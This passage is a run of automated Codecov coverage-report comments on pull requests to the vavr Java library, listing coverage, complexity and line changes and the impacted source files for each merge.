into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff            @@\nmaster   #2104   +/-\n========================================\n  Coverage      97.5%   97.5%         \n  Complexity     5202    5202         \n========================================\n  Files            92      92         \n  Lines         11944   11944         \n  Branches       1576    1576         \n========================================\n  Hits          11646   11646         \n  Misses          148     148         \n  Partials        150     150\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 2dd54ed...f9cbf79. Read the comment docs.\n. # Codecov Report\nMerging #2105 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@           Coverage Diff            @@\nmaster   #2105   +/-\n========================================\n  Coverage      97.5%   97.5%         \n  Complexity     5202    5202         \n========================================\n  Files            92      92         \n  Lines         11944   11944         \n  Branches       1576    1576         \n========================================\n  Hits          11646   11646         \n  Misses          148     148         \n  Partials        150     150\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/Lazy.java | 100% <100%> (\u00f8) | 34 <1> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update c8cb9ca...3aa7ad0. Read the comment docs.\n. # Codecov Report\nMerging #2106 into master will decrease coverage by <.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff             @@\nmaster   #2106      +/-\n===========================================\n- Coverage      97.5%   97.5%   -0.01%   \n+ Complexity     5202    5196       -6   \n===========================================\n  Files            92      92            \n  Lines         11944   11932      -12   \n  Branches       1576    1576            \n===========================================\n- Hits          11646   11634      -12   \n  Misses          148     148            \n  Partials        150     150\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 99.52% <\u00f8> (-0.03%) | 106 <0> (-6) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update c8cb9ca...7d6482b. Read the comment docs.\n. # Codecov Report\nMerging #2107 into master will decrease coverage by 0.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2107      +/-\n============================================\n- Coverage      97.5%   97.48%   -0.02%   \n  Complexity     5196     5196            \n============================================\n  Files            92       93       +1   \n  Lines         11932    11934       +2   \n  Branches       1576     1576            \n============================================\n  Hits          11634    11634            \n- Misses          148      150       +2   \n  Partials        150      150\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/CheckedConsumer.java | 0% <0%> (\u00f8) | 0 <0> (?) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0bb47ca...60502d4. Read the comment docs.\n. # Codecov Report\nMerging #2108 into master will decrease coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff             @@\nmaster   #2108      +/-\n===========================================\n- Coverage      97.5%   97.5%   -0.01%   \n+ Complexity     5198    5197       -1   \n===========================================\n  Files            93      93            \n  Lines         11934   11933       -1   \n  Branches       1576    1575       -1   \n===========================================\n- Hits          11636   11635       -1   \n  Misses          148     148            \n  Partials        150     150\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Try.java | 95.84% <100%> (-0.02%) | 93 <0> (-1) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 9f25eec...2570e4d. Read the comment docs.\n. # Codecov Report\nMerging #2109 into master will not change coverage.\nThe diff coverage is 60%.\n\n\n```diff\n@@           Coverage Diff            @@\nmaster   #2109   +/-\n========================================\n  Coverage      97.5%   97.5%         \n- Complexity     5197    5199    +2   \n========================================\n  Files            93      93         \n  Lines         11933   11933         \n  Branches       1575    1575         \n========================================\n  Hits          11635   11635         \n+ Misses          148     147    -1   \n- Partials        150     151    +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 99.52% <\u00f8> (\u00f8) | 106 <0> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 82.05% <60%> (\u00f8) | 23 <3> (+2) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 459d188...5532e99. Read the comment docs.\n. # Codecov Report\nMerging #2110 into master will decrease coverage by 0.05%.\nThe diff coverage is 76.59%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2110      +/-\n============================================\n- Coverage      97.5%   97.44%   -0.06%   \n- Complexity     5199     5203       +4   \n============================================\n  Files            93       93            \n  Lines         11933    11966      +33   \n  Branches       1575     1583       +8   \n============================================\n+ Hits          11635    11660      +25   \n- Misses          147      151       +4   \n- Partials        151      155       +4\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 99.52% <\u00f8> (\u00f8) | 106 <0> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 80.18% <76.59%> (-1.88%) | 27 <2> (+4) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 4cfae22...faff462. Read the comment docs.\n. # Codecov Report\nMerging #2114 into master will decrease coverage by 0.02%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2114      +/-\n============================================\n- Coverage      97.4%   97.37%   -0.03%   \n  Complexity     5196     5196            \n============================================\n  Files            92       92            \n  Lines         11909    11945      +36   \n  Branches       1573     1587      +14   \n============================================\n+ Hits          11600    11632      +32   \n- Misses          154      157       +3   \n- Partials        155      156       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...src/main/java/io/vavr/collection/RedBlackTree.java | 90.37% <0%> (-0.54%) | 23% <0%> (\u00f8) | |\n| ...c/main/java/io/vavr/collection/JavaConverters.java | 90.05% <0%> (-0.53%) | 1% <0%> (\u00f8) | |\n| vavr/src/main/java/io/vavr/Value.java | 93.33% <0%> (-0.19%) | 143% <0%> (\u00f8) | |\n| ...rc-gen/main/java/io/vavr/collection/ArrayType.java | 100% <0%> (\u00f8) | 26% <0%> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/BitMappedTrie.java | 100% <0%> (\u00f8) | 72% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.52% <0%> (\u00f8) | 239% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.68% <0%> (\u00f8) | 207% <0%> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/PriorityQueue.java | 98.67% <0%> (\u00f8) | 108% <0%> (\u00f8) | :arrow_down: |\n| ...n/java/io/vavr/collection/HashArrayMappedTrie.java | 98.27% <0%> (\u00f8) | 1% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Try.java | 95.87% <0%> (+0.02%) | 93% <0%> (\u00f8) | :arrow_down: |\n| ... and 1 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 05eae6e...c1a2211. Read the comment docs.\n. # Codecov Report\nMerging #2119 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2119   +/-\n=========================================\n  Coverage     97.37%   97.37%         \n  Complexity     5196     5196         \n=========================================\n  Files            92       92         \n  Lines         11945    11945         \n  Branches       1587     1587         \n=========================================\n  Hits          11632    11632         \n  Misses          157      157         \n  Partials        156      156\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/concurrent/Future.java | 97.95% <100%> (\u00f8) | 120 <0> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update c666e6c...560d2a8. Read the comment docs.\n. # Codecov Report\nMerging #2123 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2123      +/-\n============================================\n+ Coverage     97.37%   97.38%   +<.01%   \n- Complexity     5196     5197       +1   \n============================================\n  Files            92       92            \n  Lines         11945    11948       +3   \n  Branches       1587     1587            \n============================================\n+ Hits          11632    11635       +3   \n  Misses          157      157            \n  Partials        156      156\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/PartialFunction.java | 100% <100%> (\u00f8) | 2 <1> (+1) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update a6ae155...19f9dd2. Read the comment docs.\n. # Codecov Report\nMerging #2128 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2128      +/-\n============================================\n+ Coverage     97.37%   97.38%   +<.01%   \n- Complexity     5196     5197       +1   \n============================================\n  Files            92       92            \n  Lines         11945    11947       +2   \n  Branches       1587     1587            \n============================================\n+ Hits          11632    11634       +2   \n  Misses          157      157            \n  Partials        156      156\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Set.java | 80% <100%> (+13.33%) | 3 <1> (+1) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update a6ae155...e705084. Read the comment docs.\n. # Codecov Report\nMerging #2129 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2129      +/-\n============================================\n+ Coverage     97.38%   97.38%   +<.01%   \n- Complexity     5198     5202       +4   \n============================================\n  Files            92       92            \n  Lines         11949    11960      +11   \n  Branches       1587     1587            \n============================================\n+ Hits          11636    11647      +11   \n  Misses          157      157            \n  Partials        156      156\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Tree.java | 97.89% <100%> (+0.07%) | 121 <4> (+4) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update a1800e9...2bed106. Read the comment docs.\n. # Codecov Report\nMerging #2133 into master will decrease coverage by 0.02%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2133      +/-\n============================================\n- Coverage     97.45%   97.43%   -0.03%   \n  Complexity     5198     5198            \n============================================\n  Files            92       92            \n  Lines         11912    11948      +36   \n  Branches       1573     1587      +14   \n============================================\n+ Hits          11609    11641      +32   \n- Misses          148      151       +3   \n- Partials        155      156       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...src/main/java/io/vavr/collection/RedBlackTree.java | 92.1% <0%> (-0.55%) | 23% <0%> (\u00f8) | |\n| ...c/main/java/io/vavr/collection/JavaConverters.java | 90.05% <0%> (-0.53%) | 1% <0%> (\u00f8) | |\n| vavr/src/main/java/io/vavr/Value.java | 93.33% <0%> (-0.19%) | 143% <0%> (\u00f8) | |\n| ...rc/main/java/io/vavr/collection/BitMappedTrie.java | 100% <0%> (\u00f8) | 72% <0%> (\u00f8) | :arrow_down: |\n| ...rc-gen/main/java/io/vavr/collection/ArrayType.java | 100% <0%> (\u00f8) | 26% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.52% <0%> (\u00f8) | 239% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.68% <0%> (\u00f8) | 207% <0%> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/PriorityQueue.java | 98.67% <0%> (\u00f8) | 108% <0%> (\u00f8) | :arrow_down: |\n| ...n/java/io/vavr/collection/HashArrayMappedTrie.java | 98.27% <0%> (\u00f8) | 1% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Try.java | 95.87% <0%> (+0.02%) | 93% <0%> (\u00f8) | :arrow_down: |\n| ... and 1 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update f0b6ab4...f42d2b3. Read the comment docs.\n. # Codecov Report\nMerging #2144 into master will decrease coverage by 0.02%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2144      +/-\n============================================\n- Coverage     97.45%   97.43%   -0.03%   \n- Complexity     5198     5199       +1   \n============================================\n  Files            92       92            \n  Lines         11912    11951      +39   \n  Branches       1573     1588      +15   \n============================================\n+ Hits          11609    11644      +35   \n- Misses          148      151       +3   \n- Partials        155      156       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/PartialFunction.java | 100% <100%> (\u00f8) | 3 <1> (+1) | :arrow_up: |\n| ...src/main/java/io/vavr/collection/RedBlackTree.java | 92.1% <0%> (-0.55%) | 23% <0%> (\u00f8) | |\n| ...c/main/java/io/vavr/collection/JavaConverters.java | 90.05% <0%> (-0.53%) | 1% <0%> (\u00f8) | |\n| vavr/src/main/java/io/vavr/Value.java | 93.33% <0%> (-0.19%) | 143% <0%> (\u00f8) | |\n| ...rc/main/java/io/vavr/collection/BitMappedTrie.java | 100% <0%> (\u00f8) | 72% <0%> (\u00f8) | :arrow_down: |\n| ...rc-gen/main/java/io/vavr/collection/ArrayType.java | 100% <0%> (\u00f8) | 26% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.52% <0%> (\u00f8) | 239% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.68% <0%> (\u00f8) | 207% <0%> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/PriorityQueue.java | 98.67% <0%> (\u00f8) | 108% <0%> (\u00f8) | :arrow_down: |\n| ...n/java/io/vavr/collection/HashArrayMappedTrie.java | 98.27% <0%> (\u00f8) | 1% <0%> (\u00f8) | :arrow_down: |\n| ... and 2 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update f1d30ac...7537b4f. Read the comment docs.\n. # Codecov Report\nMerging #2148 into master will decrease coverage by 0.02%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2148      +/-\n============================================\n- Coverage     97.45%   97.43%   -0.03%   \n  Complexity     5199     5199            \n============================================\n  Files            92       92            \n  Lines         11915    11951      +36   \n  Branches       1574     1588      +14   \n============================================\n+ Hits          11612    11644      +32   \n- Misses          148      151       +3   \n- Partials        155      156       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...src/main/java/io/vavr/collection/RedBlackTree.java | 92.1% <0%> (-0.55%) | 23% <0%> (\u00f8) | |\n| ...c/main/java/io/vavr/collection/JavaConverters.java | 90.05% <0%> (-0.53%) | 1% <0%> (\u00f8) | |\n| vavr/src/main/java/io/vavr/Value.java | 93.33% <0%> (-0.19%) | 143% <0%> (\u00f8) | |\n| ...rc/main/java/io/vavr/collection/BitMappedTrie.java | 100% <0%> (\u00f8) | 72% <0%> (\u00f8) | :arrow_down: |\n| ...rc-gen/main/java/io/vavr/collection/ArrayType.java | 100% <0%> (\u00f8) | 26% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.52% <0%> (\u00f8) | 239% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.68% <0%> (\u00f8) | 207% <0%> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/PriorityQueue.java | 98.67% <0%> (\u00f8) | 108% <0%> (\u00f8) | :arrow_down: |\n| ...n/java/io/vavr/collection/HashArrayMappedTrie.java | 98.27% <0%> (\u00f8) | 1% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Try.java | 95.87% <0%> (+0.02%) | 93% <0%> (\u00f8) | :arrow_down: |\n| ... and 1 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update de5f0f8...3f92c72. Read the comment docs.\n. # Codecov Report\nMerging #2157 into master will increase coverage by 0.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2157      +/-\n============================================\n+ Coverage     97.45%   97.46%   +0.01%   \n- Complexity     5206     5238      +32   \n============================================\n  Files            92       92            \n  Lines         11934    11997      +63   \n  Branches       1576     1578       +2   \n============================================\n+ Hits          11630    11693      +63   \n  Misses          148      148            \n  Partials        156      156\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../src/main/java/io/vavr/collection/Collections.java | 94.44% <\u00f8> (\u00f8) | 116 <0> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/collection/IndexedSeq.java | 97.39% <\u00f8> (\u00f8) | 37 <0> (\u00f8) | :arrow_down: |\n| ...vr/src/main/java/io/vavr/collection/SortedMap.java | 100% <\u00f8> (\u00f8) | 3 <0> (\u00f8) | :arrow_down: |\n| ...c/main/java/io/vavr/collection/SortedMultimap.java | 0% <\u00f8> (\u00f8) | 0 <0> (\u00f8) | :arrow_down: |\n| ...avr/src/main/java/io/vavr/collection/Multimap.java | 98.38% <\u00f8> (\u00f8) | 28 <0> (\u00f8) | :arrow_down: |\n| .../src/main/java/io/vavr/collection/Traversable.java | 98.38% <\u00f8> (\u00f8) | 101 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Map.java | 100% <\u00f8> (\u00f8) | 34 <0> (\u00f8) | :arrow_down: |\n| ...vr/src/main/java/io/vavr/collection/LinearSeq.java | 96.7% <\u00f8> (\u00f8) | 20 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Seq.java | 98% <\u00f8> (\u00f8) | 50 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Set.java | 66.66% <\u00f8> (\u00f8) | 2 <0> (\u00f8) | :arrow_down: |\n| ... and 18 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 3365fd2...4c8e93b. Read the comment docs.\n. # Codecov Report\nMerging #2162 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2162   +/-\n=========================================\n  Coverage     97.45%   97.45%         \n  Complexity     5206     5206         \n=========================================\n  Files            92       92         \n  Lines         11934    11934         \n  Branches       1576     1576         \n=========================================\n  Hits          11630    11630         \n  Misses          148      148         \n  Partials        156      156\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/CheckedConsumer.java | 100% <\u00f8> (\u00f8) | 2 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction1.java | 96.77% <\u00f8> (\u00f8) | 18 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/CheckedPredicate.java | 0% <\u00f8> (\u00f8) | 1 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction3.java | 96.66% <\u00f8> (\u00f8) | 14 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction7.java | 97.05% <\u00f8> (\u00f8) | 14 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction6.java | 96.96% <\u00f8> (\u00f8) | 14 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction4.java | 96.77% <\u00f8> (\u00f8) | 14 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction8.java | 97.14% <\u00f8> (\u00f8) | 14 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction5.java | 96.87% <\u00f8> (\u00f8) | 14 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction2.java | 96.55% <\u00f8> (\u00f8) | 15 <0> (\u00f8) | :arrow_down: |\n| ... and 1 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0949a89...8e4675a. Read the comment docs.\n. # Codecov Report\nMerging #2164 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2164   +/-\n=========================================\n  Coverage     97.45%   97.45%         \n  Complexity     5206     5206         \n=========================================\n  Files            92       92         \n  Lines         11934    11934         \n  Branches       1576     1576         \n=========================================\n  Hits          11630    11630         \n  Misses          148      148         \n  Partials        156      156\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 3365fd2...10eea27. Read the comment docs.\n. # Codecov Report\nMerging #2165 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2165   +/-\n=========================================\n  Coverage     97.45%   97.45%         \n  Complexity     5206     5206         \n=========================================\n  Files            92       92         \n  Lines         11934    11934         \n  Branches       1576     1576         \n=========================================\n  Hits          11630    11630         \n  Misses          148      148         \n  Partials        156      156\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update d406df9...f07ae09. Read the comment docs.\n. # Codecov Report\nMerging #2166 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2166      +/-\n============================================\n+ Coverage     97.45%   97.45%   +<.01%   \n- Complexity     5206     5228      +22   \n============================================\n  Files            92       92            \n  Lines         11934    11964      +30   \n  Branches       1576     1580       +4   \n============================================\n+ Hits          11630    11660      +30   \n  Misses          148      148            \n  Partials        156      156\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/Seq.java | 98% <\u00f8> (\u00f8) | 50 <0> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/collection/IndexedSeq.java | 97.39% <\u00f8> (\u00f8) | 37 <0> (\u00f8) | :arrow_down: |\n| ...vr/src/main/java/io/vavr/collection/LinearSeq.java | 96.7% <\u00f8> (\u00f8) | 20 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Stream.java | 99% <100%> (\u00f8) | 266 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/List.java | 99.62% <100%> (\u00f8) | 266 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/Queue.java | 96.74% <100%> (+0.02%) | 202 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.52% <100%> (\u00f8) | 241 <2> (+2) | :arrow_up: |\n| .../src/main/java/io/vavr/collection/Collections.java | 94.87% <100%> (+0.42%) | 126 <10> (+10) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/CharSeq.java | 99.81% <100%> (\u00f8) | 347 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.68% <100%> (\u00f8) | 209 <2> (+2) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 3365fd2...302b22a. Read the comment docs.\n. # Codecov Report\nMerging #2169 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2169      +/-\n============================================\n+ Coverage     97.47%   97.47%   +<.01%   \n- Complexity     5260     5262       +2   \n============================================\n  Files            92       92            \n  Lines         12027    12029       +2   \n  Branches       1582     1583       +1   \n============================================\n+ Hits          11723    11725       +2   \n  Misses          148      148            \n  Partials        156      156\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/Value.java | 93.6% <100%> (+0.05%) | 146 <2> (+2) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 4273847...711208c. Read the comment docs.\n. # Codecov Report\nMerging #2170 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2170   +/-\n=========================================\n  Coverage     97.47%   97.47%         \n  Complexity     5260     5260         \n=========================================\n  Files            92       92         \n  Lines         12027    12027         \n  Branches       1582     1582         \n=========================================\n  Hits          11723    11723         \n  Misses          148      148         \n  Partials        156      156\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 4273847...a43e948. Read the comment docs.\n. # Codecov Report\nMerging #2172 into master will decrease coverage by 0.02%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2172      +/-\n============================================\n- Coverage     97.47%   97.44%   -0.03%   \n  Complexity     5260     5260            \n============================================\n  Files            92       92            \n  Lines         12027    12063      +36   \n  Branches       1582     1596      +14   \n============================================\n+ Hits          11723    11755      +32   \n- Misses          148      151       +3   \n- Partials        156      157       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...src/main/java/io/vavr/collection/RedBlackTree.java | 92.1% <0%> (-0.55%) | 23% <0%> (\u00f8) | |\n| ...c/main/java/io/vavr/collection/JavaConverters.java | 90.05% <0%> (-0.53%) | 1% <0%> (\u00f8) | |\n| vavr/src/main/java/io/vavr/Value.java | 93.36% <0%> (-0.19%) | 144% <0%> (\u00f8) | |\n| ...rc/main/java/io/vavr/collection/BitMappedTrie.java | 100% <0%> (\u00f8) | 72% <0%> (\u00f8) | :arrow_down: |\n| ...rc-gen/main/java/io/vavr/collection/ArrayType.java | 100% <0%> (\u00f8) | 26% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.53% <0%> (\u00f8) | 242% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Vector.java | 99.68% <0%> (\u00f8) | 210% <0%> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/PriorityQueue.java | 98.67% <0%> (\u00f8) | 108% <0%> (\u00f8) | :arrow_down: |\n| ...n/java/io/vavr/collection/HashArrayMappedTrie.java | 98.27% <0%> (\u00f8) | 1% <0%> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Try.java | 95.63% <0%> (+0.02%) | 95% <0%> (\u00f8) | :arrow_down: |\n| ... and 1 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 3756daf...ea6ffe7. Read the comment docs.\n. # Codecov Report\nMerging #2173 into master will increase coverage by 0.18%.\nThe diff coverage is 96.23%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2173      +/-\n============================================\n+ Coverage     97.44%   97.63%   +0.18%   \n+ Complexity     5260     5166      -94   \n============================================\n  Files            92       91       -1   \n  Lines         12063    11912     -151   \n  Branches       1596     1592       -4   \n============================================\n- Hits          11755    11630     -125   \n+ Misses          151      132      -19   \n+ Partials        157      150       -7\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...-test/src-gen/main/java/io/vavr/test/Property.java | 100% <\u00f8> (\u00f8) | 19 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/concurrent/Promise.java | 97.05% <\u00f8> (\u00f8) | 17 <0> (?) | |\n| ...avr/src/main/java/io/vavr/collection/Foldable.java | 100% <\u00f8> (\u00f8) | 3 <0> (\u00f8) | :arrow_down: |\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction3.java | 